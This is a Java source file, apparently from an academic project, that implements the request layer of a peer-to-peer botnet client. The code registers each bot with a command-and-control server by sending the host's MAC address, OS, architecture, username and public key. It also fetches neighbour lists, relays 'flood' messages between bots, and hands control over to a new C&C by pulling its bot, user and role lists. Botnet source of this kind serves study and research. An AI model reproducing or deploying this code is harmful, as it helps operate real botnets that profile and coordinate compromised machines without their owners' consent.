package cs.sii.network.request;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Future;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;

@Service("BotRequest")
public class BotRequest {

	private static final int WAIT_RANGE = 1000;

	private static final String PORT = ":8443";

	private static final String HTTPS = "https://";
	private static final String HTTP = "http://";

	public final static Integer REQNUMBER = 10;

	private static final int TIMEOUT_MILLIS = 600000;

	@Autowired
	private RestTemplate restTemplate;

	private Integer timeoutSeconds;

	@Autowired
	private CryptoPKI pki;
	@Autowired
	private CryptoUtils cUtil;

	public BotRequest() {
	}

	// response = restTemplate.postForObject(url, obj, response.getClass());

	@Async
	public Future<String> pingUser(String ipBot) {
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + ipBot);
				String response = restTemplate.postForObject("http://" + ipBot + "/bot/ping", null, String.class);
				return new AsyncResult<>(response);
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("\nSono Morto: " + ipBot + " Causa: " + e.getMessage());
				counter++;
				// Aspetto prima della prossima richiesta
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + ex);
					ex.printStackTrace();
				}
			}
		}
		return null;
	}

	@Async
	public Future<Pairs<IP, Integer>> esempioRichiesta(String uriMiner) {
		String result = "";
		Integer level = -1;
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + uriMiner);
				// result = restTemplate.getForObject("http://" + uriMiner +
				// "/fil3chain/updateAtMaxLevel", String.class);
				result = restTemplate.getForObject("http://" + uriMiner + "/fil3chain/updateAtMaxLevel",
						result.getClass());
				level = Integer.decode(result);
				System.out.println("Chain Level" + level);
				return new AsyncResult<>(new Pairs<>(new IP(uriMiner), level));
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("\nSono Morto: " + uriMiner + " Causa: " + e.getMessage());
				counter++;
			}
			try {
				Thread.sleep(WAIT_RANGE);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		return null;
	}

	/**
	 * @param iPCeC
	 * @param ipBot
	 * @param iDBot
	 */

	public ArrayList<Pairs<String,String>> askNeighbours(String iPCeC, String ipBot, String data) {
		ArrayList<Pairs<String,String>> result = new ArrayList<Pairs<String,String>>();
		Integer counter = 0;
		String encryptData="";
		try {
			// richiesta del vicinato
			encryptData = pki.getCrypto().encryptAES(data);
		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | UnsupportedEncodingException
				| InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
			System.out.println("failed to encrypt data during initialize");
			e.printStackTrace();
		}
		while (counter <= REQNUMBER) {
			try {
				String url=HTTPS+ iPCeC + PORT+"/cec/neighbours";
				System.out.println("Richiesta Vicinato a "+url);
				byte[] buf;
				//result.addAll(	Arrays.asList(restTemplate.postForObject(url, encryptData, String[].class)));
				buf =restTemplate.postForObject(url, encryptData, byte[].class);
				 ByteArrayInputStream rawData = new ByteArrayInputStream(buf);
				 result= (ArrayList<Pairs<String, String>>) cUtil.decrypt(rawData);
				System.out.println("ritorna "+result);
				return result;
			} catch (Exception e) {
				counter++;
				System.out.println("errore richiesta vicinato");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException e2) {
					e2.printStackTrace();
				}}
			
		}
		return null;
	}

	// da valutare se devono essere asincroni
	public Pairs<String, String> getIpCeCFromDnsServer(String dnsUrl) {
		Pairs<String, String> cec = new Pairs<>();
		while (true) {
			try {
				System.out.println("url request " + dnsUrl);
				String url = HTTP + dnsUrl;
				// Type type=new TypeToken<Pairs<IP,String>>(){}.getType();
				// cec = restTemplate.getForObject(url,Pairs.class);
				cec = restTemplate.postForObject(url, null, cec.getClass());
				return cec;
			} catch (Exception e) {
				System.err.println("Errore ricezione Ip da Mock Dns Server" + e);
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + e);
					ex.printStackTrace();
				}
			}
		}
	}

	@Async
	public Boolean sendFloodToOtherBot(String ipBot, String msg) {
		Boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ipBot + PORT + "/bot/flood";
				System.out.println("url bot flood" + url);
				response = restTemplate.postForObject(url, msg, response.getClass());
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore invio richiesta flood");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	// da valutare se devono essere asincroni
	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, IP ipCeC) {

		Pairs<Long, Integer> response = new Pairs<>();
		Integer counter = 0;
		while (true) {
			try {
				String url = HTTPS + ipCeC + PORT + "/cec/welcome";
				System.out.println("url challenge request " + url);
				response = restTemplate.postForObject(url, idBot, response.getClass());
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				counter++;
				System.out.println("Errore ricezione Challenge");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}
	
	//Deprecated
//	public List<Object> getObject(String ip, String i) {
//		List<Object> response = null;
//		Integer count = 0;
//		while (count < REQNUMBER) {
//			try {
//				String url = HTTPS + ip + PORT + "/cec/newKing";
//				System.out.println("request new king: " + i);
//				response = Arrays.asList(restTemplate.postForObject(url, i, Object[].class));
//				return response;
//			} catch (Exception e) {
//				// e.printStackTrace();
//				System.out.println("Errore richiesta new king");
//				try {
//					count++;
//					Thread.sleep(WAIT_RANGE);
//				} catch (InterruptedException ex) {
//					ex.printStackTrace();
//				}
//			}
//		}
//		return response;
//	}
	
	
	
	//TODO Aggiungere parametro per renderlo sicuro
	/**
	 * @param ip
	 * @return
	 */
	public List<String> getPeers(String ip) {
		List<String> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/peers";
				response = Arrays.asList(restTemplate.postForObject(url, null, String[].class));
				System.out.println("request new king peers " );
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore richiesta new king peers");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}
	
	
	/**
	 * @param ip
	 * @return
	 */
	public List<User> getUser(String ip) {
		List<User> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/users";
				response = Arrays.asList(restTemplate.postForObject(url, null, User[].class));
				System.out.println("request new king users " );
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore richiesta new king users");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}
	
	//
	/**
	 * @param ip
	 * @return
	 */
	public List<Bot> getBots(String ip) {
		List<Bot> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/bots";
				Bot[] bots = restTemplate.postForObject(url, null, Bot[].class);
				System.out.println("request new king  bots" );
				for (int i = 0; i < bots.length; i++) {
					System.out.println("bot "+ bots [i].toString());
				}
				response = Arrays.asList(bots);
				response.forEach(b->System.out.println("bot list"+ b.toString()));
				return response;
			} catch (Exception e) {
				 e.printStackTrace();
				System.out.println("Errore richiesta new king bots");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}
	
	
	
	
	/**
	 * @param ip
	 * @return
	 */
	public List<Role> getRoles(String ip) {
		List<Role> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/roles";
				response = Arrays.asList(restTemplate.postForObject(url, null, Role[].class));
				System.out.println("request new king roles ");
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore richiesta new king roles");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}
	/**
	 * @param ip
	 * @return
	 */
	public boolean ready(String ip) {
		boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/ready";
				response =restTemplate.postForObject(url, null, boolean.class);
				System.out.println("ready cec ");
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore richiesta conferma to old cec");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	// da valutare se devono essere asincroni
	/**
	 * @param idBot
	 *            botdata
	 * @param ip
	 *            botdata
	 * @param Mac
	 *            botdata
	 * @param os
	 *            botdata
	 * @param vers
	 *            botdata
	 * @param arch
	 *            botdata
	 * @param usrName
	 *            botdata
	 * @param dest
	 *            destinatio ip of request
	 * @param hashMac
	 *            mac to be verified
	 * @param elegible
	 * @return
	 */
	public String getResponseFromCeC(String idBot, IP ip, String Mac, String os, String vers, String arch,
			String usrName, IP dest, String hashMac, PublicKey pk, boolean elegible) {
		Integer counter = 0;
		String response = "";
		while (true) {// (counter <= REQNUMBER) {
			// Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
			// String postRequest = "{\"hashMac\":\""+hashMac+"\"}";
			try {
				// response = doPost("http://"+ip+":8080/welcome/hmac",
				// hashMac);
				// RestTemplate rest=new RestTemplate();

				List<Object> objects = new ArrayList<Object>();
				objects.add(idBot);
				objects.add(ip.toString());
				objects.add(Mac);
				objects.add(os);
				objects.add(vers);
				objects.add(arch);
				objects.add(usrName);
				objects.add(hashMac);
				objects.add(pki.demolishPuK(pk));
				objects.add(elegible);
				response = restTemplate.postForObject(HTTPS + dest + PORT + "/cec/hmac", objects, String.class);
				System.out.println("Ok");
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("response:   " + response);
				System.out.println("Errore risoluzione Hmac con CeC");
				counter++;
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	public String askMyIpToAmazon() {
		String amazing = "http://checkip.amazonaws.com/";
		String response = "";
		while (true) {
			try {
				response = restTemplate.getForObject(amazing, response.getClass());
				return response;
			} catch (Exception e) {
				System.out.println("no internet");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
				e.printStackTrace();
			}
		}
	}

	// public static String doGet(String url) throws Exception {
	//
	// // HttpPost request = new HttpPost(url);
	//
	// HttpGet request = new HttpGet(url);
	//
	// RequestConfig requestConfig =
	// RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
	// .setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
	//
	// request.setConfig(requestConfig);
	//
	// HttpClient client = HttpClientBuilder.create().build();
	//
	// HttpResponse response;
	// response = client.execute(request);
	// BufferedReader rd;
	// rd = new BufferedReader(new
	// InputStreamReader(response.getEntity().getContent()));
	// StringBuffer result = new StringBuffer();
	// String line = "";
	// while ((line = rd.readLine()) != null) {
	// result.append(line);
	// }
	// return result.toString();
	// }

	// public static String doPost(String url, String raw_data) throws Exception
	// {
	//
	// HttpClient client = HttpClientBuilder.create().build();
	// HttpGet request = new HttpGet(url);
	// HttpPost post = new HttpPost(url);
	// // List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
	// // for (Pairs<?, ?> p : parameters) {
	// // urlParameters.add(new BasicNameValuePair(p.getValue1().toString(),
	// // p.getValue2().toString()));
	// // }
	//
	// RequestConfig requestConfig =
	// RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
	// .setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
	//
	// request.setConfig(requestConfig);
	//
	// post.setEntity(new StringEntity(raw_data));
	// HttpResponse response = client.execute(post);
	// BufferedReader rd;
	// rd = new BufferedReader(new
	// InputStreamReader(response.getEntity().getContent()));
	// StringBuffer result = new StringBuffer();
	// String line = "";
	// while ((line = rd.readLine()) != null) {
	// result.append(line);
	// }
	// return result.toString();
	// }
	//
	// @SuppressWarnings("unchecked")
	// public static <T> T doGetJSON(String url, Type t) throws IOException {
	//
	// HttpClient client = HttpClientBuilder.create().build();
	// HttpGet request = new HttpGet(url);
	//
	// RequestConfig requestConfig =
	// RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
	// .setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
	//
	// request.setConfig(requestConfig);
	//
	// HttpResponse response;
	// response = client.execute(request);
	// BufferedReader rd;
	// rd = new BufferedReader(new
	// InputStreamReader(response.getEntity().getContent()));
	// StringBuffer result = new StringBuffer();
	// String line = "";
	// while ((line = rd.readLine()) != null) {
	// result.append(line);
	// }
	//
	// return Conversions.fromJson(result.toString(), t);
	// }

	public int getTimeoutSeconds() {
		return timeoutSeconds;
	}

	public void setTimeoutSeconds(int timeoutSeconds) {

		this.timeoutSeconds = timeoutSeconds;
	}

}
